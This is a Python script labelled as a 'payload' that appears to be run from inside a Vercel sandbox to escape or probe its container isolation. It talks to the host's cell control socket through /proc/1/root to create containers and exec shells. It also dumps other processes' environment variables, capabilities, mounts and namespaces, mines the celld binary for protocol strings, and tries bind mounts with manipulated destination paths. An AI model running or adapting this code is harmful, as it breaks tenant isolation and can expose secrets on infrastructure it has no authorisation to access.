# -*- coding: utf-8 -*-
"""v164 payload: 找 Exec 容器进程 + /proc/<pid>/root 读容器 rootfs + Mount descriptor
输出 /vercel/sandbox/v164c.out"""
import socket, struct, time, json, os, signal, re, ctypes

OUT = '/vercel/sandbox/v164c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(280)

R = '/proc/1/root'
CELL = R + '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'


def log(s, maxlen=400):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def raw_req(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return st, d[hdr_end + 4:hdr_end + 4 + 1000] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def bin_ctx(path, anchors, before=150, after=1000, max_hits=12):
    try:
        data = open(path, 'rb').read()
        hits = 0
        for anc in anchors:
            if hits >= max_hits:
                break
            for m in re.finditer(re.escape(anc), data):
                s = max(0, m.start() - before)
                seg = data[s:m.start() + after]
                log('CTX %s @0x%x: %r' % (anc, m.start(), seg))
                hits += 1
                if hits >= max_hits:
                    break
        log('CTX done hits=%d' % hits)
    except Exception as e:
        log('CTX EXC %s' % e)


def list_all_procs(interesting):
    res = []
    for d in sorted(os.listdir('/proc')):
        if d.isdigit():
            try:
                comm = open('/proc/%s/comm' % d).read().strip()
            except Exception:
                continue
            if comm in interesting:
                try:
                    cl = open('/proc/%s/cmdline' % d).read()[:150].replace('\x00', ' ')
                except Exception:
                    cl = '?'
                res.append((d, comm, cl))
    return res


# ============ 1: Create + Start + Exec 长命进程 ============
log('=== 1 setup ===')
st, pay = raw_req(CELL, '%s/Create' % CTRS,
                  json.dumps({'drive_id': 'sandbox', 'command': 'sleep'}).encode(), t=8)
log('Create sleep -> %s %r' % (st, pay[:200]))
m = re.search(rb'containerId["\s:]+([A-Za-z0-9_-]+)', pay)
cid = m.group(1).decode() if m else ''
log('cid=%s' % cid)
if cid:
    st2, pay2 = raw_req(CELL, '%s/Start' % CTRS, json.dumps({'container_id': cid}).encode(), t=8)
    log('Start -> %s %r' % (st2, pay2[:200]))
    body = json.dumps({'container_id': cid,
                       'process': {'command': '/bin/sh',
                                   'arguments': ['-c', 'sleep 300; echo ALIVE']}}).encode()
    st3, pay3 = raw_req(CELL, '%s/Exec' % CTRS, body, t=8)
    log('Exec sleep300 -> %s %r' % (st3, pay3[:200]))
    time.sleep(1.5)

# ============ 2: 找容器进程 ============
log('=== 2 find procs ===')
procs = list_all_procs(['sh', 'sleep', 'bash', 'runc', 'init'])
for pid, comm, cl in procs:
    log('proc %s comm=%s cmd=%s' % (pid, comm, cl[:150]))
# 找带 sleep 300 的 sh
target = None
for pid, comm, cl in procs:
    if 'sleep 300' in cl:
        target = pid
        break
log('target=%s' % target)
if not target:
    # 找任何 sh
    for pid, comm, cl in procs:
        if comm == 'sh':
            target = pid
            break
    log('target fallback=%s' % target)

# ============ 3: 容器 rootfs 视角 ============
if target:
    log('=== 3 container view pid=%s ===' % target)
    # status
    try:
        stt = open('/proc/%s/status' % target).read()
        for ln in stt.splitlines():
            if ln.startswith(('CapEff:', 'CapBnd:', 'Seccomp:', 'NoNewPrivs:', 'Uid:', 'Gid:', 'NSpid:', 'PPid:', 'Name:')):
                log('ST %s' % ln)
    except Exception as e:
        log('ST EXC %s' % e)
    # environ
    try:
        env = open('/proc/%s/environ' % target).read().replace('\x00', '\n')
        log('ENV %s' % env[:1500])
    except Exception as e:
        log('ENV EXC %s' % e)
    # mountinfo
    try:
        for ln in open('/proc/%s/mountinfo' % target).read().splitlines()[:40]:
            log('MI %s' % ln[:220])
    except Exception as e:
        log('MI EXC %s' % e)
    # root 枚举
    try:
        for e in sorted(os.listdir('/proc/%s/root' % target))[:40]:
            log('ROOT /%s' % e)
    except Exception as e:
        log('ROOT EXC %s' % e)
    # 验证 Exec 写的文件
    for p in ['/proc/%s/root/tmp/v163m' % target, '/proc/%s/root/tmp/v163pwd' % target,
              '/proc/%s/root/tmp/v163ls' % target, '/proc/%s/root/etc/v163m' % target]:
        try:
            d = open(p).read()
            log('CF %s=%r' % (p, d[:300]))
        except Exception as e:
            log('CF %s ERR %s' % (p, type(e).__name__))
    # cwd + exe
    try:
        log('CWD %s' % os.readlink('/proc/%s/cwd' % target))
        log('EXE %s' % os.readlink('/proc/%s/exe' % target))
    except Exception as e:
        log('CE EXC %s' % e)
    # ns 列表
    try:
        for ns in ['pid', 'mnt', 'net', 'uts', 'ipc', 'user']:
            log('NS %s %s' % (ns, os.readlink('/proc/%s/ns/%s' % (target, ns))))
    except Exception as e:
        log('NS EXC %s' % e)
    # cgroup
    try:
        log('CG %s' % open('/proc/%s/cgroup' % target).read()[:400])
    except Exception as e:
        log('CG EXC %s' % e)
    # fd 列表
    try:
        for fd in sorted(os.listdir('/proc/%s/fd' % target))[:20]:
            try:
                log('FD %s' % os.readlink('/proc/%s/fd/%s' % (target, fd)))
            except Exception:
                pass
    except Exception as e:
        log('FD EXC %s' % e)

# ============ 4: Mount descriptor 提取 ============
log('=== 4 mount proto ===')
bin_ctx(R + '/opt/vercel/celld',
        [b'MountTypeDrive', b'MountTypeOverlay', b'MountTypeTmpfs', b'MountTypeSquashfs',
         b'OutputStream', b'StreamOutputRequest'],
        before=200, after=1100, max_hits=12)

# ============ 5: Mount 相对路径 destination ============
log('=== 5 mount rel ===')
if cid:
    for dst in ['tmp/x', 'mnt/x', './tmp/x', 'tmp', '/tmp/x/', '/tmp//x', 'a/b/c']:
        st5, pay5 = raw_req(CELL, '%s/Mount' % CTRS,
                            json.dumps({'container_id': cid,
                                        'mounts': [{'bind': {'source': '/tmp', 'destination': dst,
                                                             'mode': 'MOUNT_MODE_READ_WRITE'}}]}).encode(), t=5)
        mm = re.search(rb'"message":"([^"]+)"', pay5)
        msg = mm.group(1).decode(errors='replace') if mm else pay5[:120].decode(errors='replace')
        log('Mount dst=%r -> %s %s' % (dst, st5, msg))
        if '200' in st5:
            log('  OK dst=%r' % dst)

# ============ 6: 通过容器视角确认挂载 ============
log('=== 6 post ===')
if cid and target:
    body = json.dumps({'container_id': cid,
                       'process': {'command': '/bin/sh',
                                   'arguments': ['-c', 'cat /tmp/v163pwd 2>&1; ls -la / 2>&1 | head -20; echo ---; cat /tmp/v163m 2>&1']}}).encode()
    st6, pay6 = raw_req(CELL, '%s/Exec' % CTRS, body, t=8)
    log('Exec read -> %s %r' % (st6, pay6[:200]))
    time.sleep(1)
    # 通过 /proc 读
    for pid, comm, cl in list_all_procs(['sh']):
        if 'cat /tmp/v163pwd' in cl:
            time.sleep(0.5)

log('V164_DONE')
f.close()
